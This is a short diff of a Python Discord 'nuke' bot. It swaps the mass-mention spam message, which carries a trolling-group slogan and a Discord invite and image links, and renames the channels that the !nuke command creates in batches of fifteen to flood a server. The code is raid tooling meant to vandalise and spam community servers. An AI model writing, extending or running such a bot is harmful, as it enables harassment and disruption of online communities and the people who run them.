@@ -11,10 +11,10 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 宣伝文 = (
     "@everyone @here\n"
-    "# Nuked by AS\n"
-    "https://discord.gg/KdBrcWPw77\n"
-    "https://imgur.com/NbBGFcf\n"
-    "https://imgur.com/7LisFJg"
+    "# 荒らし人民連合万歳\n"
+    "https://discord.gg/A6jfawVAXV\n"
+    "https://cdn.discordapp.com/attachments/1366799790825934901/1372779394153709639/54_20250516123447.png?ex=682803f0&is=6826b270&hm=d5b46dbf146b9c79efedbc342e6430c03fd0809c6bd423581e6f8e5229f0688f&\n"
+    "https://imgur.com/NbBGFcf"
 )
 
 @bot.event
@@ -35,7 +35,7 @@ async def nuke(ctx):
     new_channels = []
     for i in range(0, 60, 15):
         tasks = [
-            asyncio.create_task(guild.create_text_channel("nuked by AS"))
+            asyncio.create_task(guild.create_text_channel("nuked by AARX"))
             for _ in range(15)
         ]
         results = await asyncio.gather(*tasks, return_exceptions=True)
